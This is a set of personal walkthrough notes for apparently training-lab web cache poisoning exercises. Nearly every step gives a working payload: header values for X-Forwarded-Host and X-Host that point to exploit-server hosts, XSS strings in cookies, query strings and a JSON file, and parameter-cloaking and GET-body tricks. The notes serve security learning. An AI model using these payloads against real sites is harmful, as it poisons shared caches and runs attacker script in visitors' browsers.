# Exploiting cache design flaws
1. This lab has a basic cache poisoning attack where the unkeyed header `X-Forwarded-For` is used to dynamically generate a link to an external script. As such, by changing the exploit server's exploit page to be `/resources/js/tracking.js` and sending a request with the following header added, the cache can be poisoned to execute arbitrary javascript as is set in the exploit server: `X-Forwarded-Host: exploit-ac2e1fa71f190dabc0461bbf01f80054.web-security-academy.net`
2. This lab has a bug where the `Cookie` header is unkeyed, and one of the cookies is reflected within a script block. As such, sending a request with the following cookie can be used to cause XSS via cache poisoning: `fehost="}-alert(document.cookie)-{"asdf":"`
3. This lab has a bug where the request to `/resources/js/tracking.js` can be poisoned through a combination of the `X-Forwarded-Scheme` and `X-Forwarded-Host` headers. When the `X-Forwarded-Scheme` header is present and has a value of anything other than `https`, it returns a dynamically created redirection to the HTTPS version. It will use the `X-Forwarded-Host` value in this redirection, if it is present. As such, setting the exploit server to return `alert(document.cookie)` in response to `GET /resources/js/tracking.js` allows the following headers to poison the GET request and result in XSS:
```
X-Forwarded-Scheme: asdf
X-Forwarded-Host: exploit-acc71f921e3efb2ec0ef0c52015b0021.web-security-academy.net
```
4. This lab has a cache poisoning attack like the first lab, but with the `X-Host` header instead. However, the `User-Agent` header is keyed as well. As such, the user agent of the target must be discovered. This can be done by posting a comment with an image pointing to the exploit server, where the user agent can be seen. As such, the same steps as lab 1 can be followed, but with the following headers set to poison the cache:
```
X-Host: exploit-aca81f841e4b792ec0feb4c70164001b.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36
```
5. This lab has a cache poisoning attack where the `X-Forwarded-Host` header is used to generate a link to JSON data that is handled unsafely, resulting in a DOM-based XSS vulnerability. By setting the exploit server's endpoint to `/resources/json/geolocate.json`, adding the `Access-Control-Allow-Origin: *` header to enable CORS, and setting the content to `{"country": "<img src=x onerror=alert(document.cookie)"}`, the cache poisoning attack can be triggered by sending a request with the following header: `X-Forwarded-Host: exploit-acee1f8a1f8d8321c0789c210182007d.web-security-academy.net`. This lab does not allow caching of responses that contain the `Set-Cookie` header, so the attack has to be performed after receiving a session cookie.
6. This lab has a cache poisoning attack where the `X-Forwarded-Host` header is used to generate a link to JSON data that has a DOM-based XSS vulnerability if the user has their language set to something other than English when accessing `/?localized=1`. There is a second cache poisoning attack where the `X-Original-URL` header can be used to force a redirect to a cached URL. As a result, the normal `/` endpoint can be poisoned using the header `X-Original-URL: /setlang\es` in order to cause accesses to that page to automatically set the user's page to Spanish and redirect them to the `/?localized=1` endpoint, which can also be poisoned with the header `X-Forwarded-Host: exploit-ac7b1fbd1f489461c05f1bf301b50095.web-security-academy.net` to import the malicious JSON file. In order for this to work, the exploit server's endpoint must be configured to `/resources/json/translations.json` with CORS enabled and the following body (taken from and modified from the real file):
```
{
 "en": {
        "name": "English"
    },
    "es": {
        "name": "espaÃ±ol",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "</a><img src=x onerror=alert(document.cookie)>",
            "Description:": "DescripciÃ³n:"
        }
    }
}
```

# Exploiting cache implementation flaws
1. This lab excludes the query string from the cache key, but the `Origin` header can be used as a cache buster. The query string is reflected within a `<link>` tag however, so it can be used for XSS. As such, sending a request to the following URL can poison the cache: `/?xss='><script>alert(1)</script>`
2. This lab includes most of the query string, but excludes the `utm_content` GET parameter (and its value). Once again, the URL is unsafely reflected within the page, so sending a request to the following URL can poison the cache: `/?cb=1324&utm_content=%27><script>alert(1)</script>`
3. This lab also excludes the `utm_content` parameter, but doesn't reflect the query string within the response. However, the backend allows for separating GET parameters using `;` instead of `&` while the cache does not, so a keyed parameter can be overriden by an unkeyed one. As a result, the cache for `/js/geolocate.js` can be poisoned by submitting a request to the following: `/js/geolocate.js?callback=setCountryCookie&utm_content=asdf;callback=alert(1)//`
4. This lab caches the query string, but the backend servers accepts GET requests containing a body. As such, the cache for `/js/geolocate.js` can be poisoned by submitting a get request to `/js/geolocate.js?callback=setCountryCookie` with the body `callback=alert(1)//`
5. This lab has the cache normalize all request paths, so that they are the same whether or not they are URL-encoded. Additionally, there is a self-XSS vulnerability in the 404 page, but it is not exploitable via a web browser due to the automatic URL encoding. By combining these, you can manually send a request to `/xss</p><script>alert(1)</script>` in order to poison the cache, so anyone who follows that link will have the XSS trigger even though their browser used URL encoding
6. I couldn't figure out this lab. Even after following the instructions, it caused a 500 error instead of solving the lab, so I'm not entirely sure what the solution is supposed to be. The solution does mention some interesting behavior though, such as an unkeyed `utm_content` parameter, client-side parameter pollution in `/js/localize.js`, and the ability to leak the cache key using the `Pragma: x-get-cache-key` header to find out how to inject into the cache key
7. This lab has a 2nd internal cache that is used for the reference to `/js/geolocate.js`. This can be overriden using the `X-Forwarded-Host` header. As a result, the internal cache for that specific reference can be overriden by setting `X-Forwarded-Host: exploit-acd01fc21e5f8868c0ca65e0015a00bc.web-security-academy.net`, causing it to load an arbitrary javascript file whenever any user loads the page
